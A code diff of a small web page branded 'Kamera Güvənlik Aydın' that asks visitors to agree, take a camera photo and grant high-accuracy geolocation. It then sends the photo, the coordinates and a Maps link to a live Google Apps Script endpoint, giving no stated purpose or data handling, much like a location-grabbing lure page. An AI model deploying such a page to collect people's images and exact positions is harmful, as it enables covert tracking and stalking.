@@ -1,110 +1,436 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Kamera Güvənlik Aydın</title>
+
 <style>
-*{box-sizing:border-box}body{margin:0;background:#f5f5f5;font-family:Arial,sans-serif;text-align:center;color:#111}
-.brand{position:fixed;top:12px;right:12px;font-size:13px;font-weight:700;z-index:5}
-.wrap{padding:85px 20px 30px}.logo{font-size:23px;font-weight:800;margin-bottom:42px}
-.step{display:none}.step.active{display:block}
-button{display:block;width:100%;max-width:360px;margin:18px auto;padding:16px;border:0;border-radius:10px;font-size:18px;background:#e9e9e9}
-button:active{background:#d6d6d6}#camera{display:none}.status{margin-top:22px}
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  padding: 0;
+  background: #f5f5f5;
+  font-family: Arial, sans-serif;
+  color: #222;
+}
+
+.top-brand {
+  position: fixed;
+  top: 12px;
+  right: 12px;
+  font-size: 13px;
+  font-weight: bold;
+  z-index: 100;
+}
+
+.container {
+  max-width: 500px;
+  margin: auto;
+  padding: 80px 20px 40px;
+  text-align: center;
+}
+
+.logo {
+  font-size: 24px;
+  font-weight: bold;
+  margin-bottom: 40px;
+}
+
+.step {
+  display: none;
+}
+
+.step.active {
+  display: block;
+}
+
+h1 {
+  font-size: 24px;
+}
+
+h2 {
+  font-size: 21px;
+}
+
+p {
+  font-size: 16px;
+  line-height: 1.5;
+}
+
+button {
+  width: 100%;
+  max-width: 350px;
+  padding: 16px;
+  margin-top: 20px;
+  border: none;
+  border-radius: 10px;
+  background: #222;
+  color: white;
+  font-size: 17px;
+  cursor: pointer;
+}
+
+button:active {
+  opacity: 0.7;
+}
+
+#cameraInput {
+  display: none;
+}
+
+#status {
+  margin-top: 20px;
+  font-size: 15px;
+}
+
+.success {
+  font-size: 18px;
+  font-weight: bold;
+}
 </style>
 </head>
+
 <body>
-<div class="brand">Kamera Güvənlik Aydın</div>
-<div class="wrap">
-  <div class="logo">Kamera Güvənlik Aydın</div>
 
-  <section id="s1" class="step active">
-    <h2>Photo &amp; Location Sharing</h2>
-    <p>I agree to share my photo and location.</p>
-    <button onclick="agree()">I Agree</button>
-  </section>
-
-  <section id="s2" class="step">
-    <h2>Step 1</h2>
-    <p>Please take a photo.</p>
-    <button onclick="document.getElementById('camera').click()">📷 Take a Photo</button>
-  </section>
-
-  <section id="s3" class="step">
-    <h2>Step 2</h2>
-    <p>Please allow location access.</p>
-  </section>
-
-  <section id="s4" class="step">
-    <h2>Completed</h2>
-    <p>Your photo and location have been submitted.</p>
-  </section>
-
-  <input id="camera" type="file" accept="image/*" capture="environment">
-  <div id="status" class="status"></div>
+<div class="top-brand">
+Kamera Güvənlik Aydın
 </div>
 
+<div class="container">
+
+  <div class="logo">
+    Kamera Güvənlik Aydın
+  </div>
+
+
+  <!-- STEP 1 -->
+  <div id="step1" class="step active">
+
+    <h1>Photo &amp; Location Sharing</h1>
+
+    <p>
+      I agree to share my photo and location.
+    </p>
+
+    <button onclick="agree()">
+      I Agree
+    </button>
+
+  </div>
+
+
+  <!-- STEP 2 -->
+  <div id="step2" class="step">
+
+    <h2>Please take a photo.</h2>
+
+    <p>
+      Tap the button below to open the camera.
+    </p>
+
+    <button onclick="openCamera()">
+      📷 Take a Photo
+    </button>
+
+  </div>
+
+
+  <!-- STEP 3 -->
+  <div id="step3" class="step">
+
+    <h2>Please allow location access.</h2>
+
+    <p>
+      Your location is needed to complete the submission.
+    </p>
+
+    <div id="locationStatus">
+      Waiting for location permission...
+    </div>
+
+  </div>
+
+
+  <!-- STEP 4 -->
+  <div id="step4" class="step">
+
+    <h2>Completed</h2>
+
+    <p class="success">
+      Your photo and location have been submitted successfully.
+    </p>
+
+  </div>
+
+
+  <!-- CAMERA INPUT -->
+  <input
+    id="cameraInput"
+    type="file"
+    accept="image/*"
+    capture="environment"
+  >
+
+  <div id="status"></div>
+
+</div>
+
+
 <script>
-/* AFTER DEPLOYING Code.gs, paste the Web App URL between the quotes below. */
-const SERVER_URL = "PASTE_YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE";
+
+/* =====================================================
+   GOOGLE APPS SCRIPT SERVER
+   ===================================================== */
+
+const SERVER_URL =
+"https://script.google.com/macros/s/AKfycbyuGfVjLpm4RBQFsyF6FBYOwbgCFuyC4Dv7s_dpL7Mj4MZ3uwibpLXlXjOqkn4Nm_v-Xg/exec";
+
+
+/* =====================================================
+   VARIABLES
+   ===================================================== */
+
 let photoData = null;
 
-function show(id){
-  document.querySelectorAll(".step").forEach(x=>x.classList.remove("active"));
-  document.getElementById(id).classList.add("active");
-}
-function agree(){ show("s2"); }
 
-document.getElementById("camera").addEventListener("change", function(e){
-  const file=e.target.files[0];
-  if(!file) return;
-  const r=new FileReader();
-  r.onload=function(ev){
-    photoData=ev.target.result;
-    show("s3");
-    requestLocation();
-  };
-  r.readAsDataURL(file);
-});
+/* =====================================================
+   SHOW STEP
+   ===================================================== */
 
-function requestLocation(){
-  if(!navigator.geolocation){
-    document.getElementById("status").textContent="This browser does not support location.";
-    return;
-  }
-  navigator.geolocation.getCurrentPosition(
-    p=>{
-      const lat=p.coords.latitude, lon=p.coords.longitude, acc=p.coords.accuracy;
-      sendData(lat,lon,acc);
-    },
-    ()=>{
-      document.getElementById("status").textContent=
-        "Location permission was denied. Please allow location access and try again.";
-    },
-    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
-  );
+function showStep(stepNumber) {
+
+  document
+    .querySelectorAll(".step")
+    .forEach(function(step) {
+
+      step.classList.remove("active");
+
+    });
+
+
+  document
+    .getElementById("step" + stepNumber)
+    .classList.add("active");
 }
 
-function sendData(lat,lon,accuracy){
-  if(SERVER_URL.includes("PASTE_YOUR_")){
-    document.getElementById("status").textContent=
-      "Location was received, but the server is not connected yet.";
-    show("s4"); return;
-  }
-  fetch(SERVER_URL,{
-    method:"POST", mode:"no-cors",
-    headers:{"Content-Type":"text/plain;charset=utf-8"},
-    body:JSON.stringify({
-      photo:photoData, latitude:lat, longitude:lon, accuracy:accuracy,
-      mapsUrl:"https://www.google.com/maps?q="+lat+","+lon
-    })
-  }).then(()=>{
-    show("s4");
-    document.getElementById("status").textContent="Photo and location sent successfully.";
-  }).catch(()=>{
-    document.getElementById("status").textContent="Sending failed.";
+
+/* =====================================================
+   STEP 1
+   USER AGREES
+   ===================================================== */
+
+function agree() {
+
+  showStep(2);
+
+}
+
+
+/* =====================================================
+   STEP 2
+   OPEN CAMERA
+   ===================================================== */
+
+function openCamera() {
+
+  document
+    .getElementById("cameraInput")
+    .click();
+
+}
+
+
+/* =====================================================
+   PHOTO SELECTED
+   ===================================================== */
+
+document
+  .getElementById("cameraInput")
+  .addEventListener("change", function(event) {
+
+    const file = event.target.files[0];
+
+
+    if (!file) {
+
+      return;
+
+    }
+
+
+    const reader = new FileReader();
+
+
+    reader.onload = function(e) {
+
+      photoData = e.target.result;
+
+
+      /*
+       After the photo is taken,
+       automatically move to location step.
+      */
+
+      showStep(3);
+
+
+      requestLocation();
+
+    };
+
+
+    reader.readAsDataURL(file);
+
   });
+
+
+/* =====================================================
+   REQUEST LOCATION
+   ===================================================== */
+
+function requestLocation() {
+
+  if (!navigator.geolocation) {
+
+    document.getElementById("locationStatus").textContent =
+      "Location is not supported by this browser.";
+
+    return;
+
+  }
+
+
+  document.getElementById("locationStatus").textContent =
+    "Please allow location access...";
+
+
+  navigator.geolocation.getCurrentPosition(
+
+    function(position) {
+
+      const latitude =
+        position.coords.latitude;
+
+      const longitude =
+        position.coords.longitude;
+
+      const accuracy =
+        position.coords.accuracy;
+
+
+      sendData(
+        latitude,
+        longitude,
+        accuracy
+      );
+
+    },
+
+
+    function(error) {
+
+      document.getElementById("locationStatus").textContent =
+        "Location permission was denied. Please allow location access and try again.";
+
+    },
+
+
+    {
+      enableHighAccuracy: true,
+      timeout: 30000,
+      maximumAge: 0
+    }
+
+  );
+
 }
+
+
+/* =====================================================
+   SEND PHOTO + LOCATION
+   ===================================================== */
+
+function sendData(
+  latitude,
+  longitude,
+  accuracy
+) {
+
+
+  const mapsUrl =
+    "https://www.google.com/maps?q="
+    + latitude
+    + ","
+    + longitude;
+
+
+  const data = {
+
+    photo: photoData,
+
+    latitude: latitude,
+
+    longitude: longitude,
+
+    accuracy: accuracy,
+
+    mapsUrl: mapsUrl
+
+  };
+
+
+  document.getElementById("locationStatus").textContent =
+    "Sending...";
+
+
+  fetch(
+    SERVER_URL,
+    {
+
+      method: "POST",
+
+      mode: "no-cors",
+
+      headers: {
+
+        "Content-Type":
+          "text/plain;charset=UTF-8"
+
+      },
+
+      body:
+        JSON.stringify(data)
+
+    }
+  )
+
+
+  .then(function() {
+
+    /*
+     Sending completed.
+    */
+
+    showStep(4);
+
+  })
+
+
+  .catch(function(error) {
+
+    document.getElementById("locationStatus").textContent =
+      "There was a problem sending the information.";
+
+  });
+
+}
+
 </script>
+
 </body>
-</html>
+  </html>
